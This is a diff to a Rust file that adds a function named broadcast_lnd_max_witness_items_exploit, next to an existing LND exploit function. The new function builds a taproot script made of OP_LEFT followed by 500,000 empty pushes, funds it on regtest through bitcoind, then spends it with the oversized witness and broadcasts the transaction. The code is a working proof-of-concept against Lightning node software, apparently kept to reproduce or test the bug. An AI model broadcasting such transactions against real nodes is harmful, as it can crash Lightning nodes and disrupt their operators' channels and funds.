@@ -317,3 +317,75 @@ pub fn broadcast_lnd_15_exploit(
         Err(e) => Err(e.into()),
     }
 }
+
+pub fn broadcast_lnd_max_witness_items_exploit(
+    bitcoind_client: Arc<Client>,
+) -> Result<Txid, Box<dyn std::error::Error>> {
+    // TODO generate tweaked public key
+    let secp = Secp256k1::new();
+    let internal_key = UntweakedPublicKey::from_str(
+        "93c7378d96518a75448821c4f7c8f4bae7ce60f804d03d1f0628dd5dd0f5de51",
+    )
+    .unwrap();
+
+    // OP_LEFT is a disabled op code that is now an OP_SUCCESSSx under taproot
+    let init = Builder::new().push_opcode(opcodes::all::OP_LEFT);
+
+    let script_builder = (0..500_000)
+        .into_iter()
+        .fold(init, |b, _| b.push_slice(&vec![]));
+
+    let script = script_builder.into_script();
+    let tr_script = script.to_v1_p2tr(&secp, internal_key);
+    let addr = Address::from_script(&tr_script, Network::Regtest).unwrap();
+
+    let amount: Amount = Amount::from_sat(110_000);
+
+    let txid =
+        bitcoind_client.send_to_address(&addr, amount, None, None, None, None, None, None)?;
+
+    // find which output was used to fund the address
+    let get_tx_out_result = bitcoind_client.get_tx_out(&txid, 0, Some(true))?;
+    let is_vout_0_opt = get_tx_out_result.map(|r| {
+        r.script_pub_key
+            .script()
+            .map(|s| s == tr_script)
+            .unwrap_or(false)
+    });
+    let is_vout_0 = is_vout_0_opt.unwrap_or(false);
+    let vout = if is_vout_0 { 0 } else { 1 };
+
+    // create taproot tree
+    let tr = TaprootBuilder::new().add_leaf(0, script.clone()).unwrap();
+    let spend_info = tr
+        .finalize(&secp, internal_key)
+        .expect("Could not create taproot spend info");
+    // create control block
+    let control_block = spend_info
+        .control_block(&(script.clone(), LeafVersion::TapScript))
+        .expect("Could not create control block");
+    // witness is spending script followed by control block
+    let witness = vec![script.serialize(), control_block.serialize()];
+
+    let txin = TxIn {
+        previous_output: OutPoint { txid, vout },
+        script_sig: Script::new(),
+        sequence: Sequence::default(),
+        witness: Witness::from_vec(witness),
+    };
+
+    let created_tx = Transaction {
+        version: 2,
+        lock_time: PackedLockTime::ZERO,
+        input: vec![txin],
+        output: vec![TxOut {
+            value: amount.to_sat() - 10_000,
+            script_pubkey: Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros()),
+        }],
+    };
+
+    match bitcoind_client.send_raw_transaction(&created_tx) {
+        Ok(txid) => Ok(txid),
+        Err(e) => Err(e.into()),
+    }
+}
